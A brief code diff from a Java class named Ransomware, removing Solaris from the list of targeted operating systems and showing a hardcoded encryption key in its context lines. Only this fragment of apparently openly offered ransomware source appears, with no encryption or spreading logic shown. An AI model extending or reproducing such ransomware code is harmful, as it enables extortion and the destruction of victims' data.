@@ -15,8 +15,7 @@ public class Ransomware {
   public enum OS {
     WINDOWS,
     LINUX,
-    MAC,
-    SOLARIS
+    MAC
   };
 
   public static String key = "QfTjWmZq4t7w!z%C"; // 128 bit encryption/decryption key
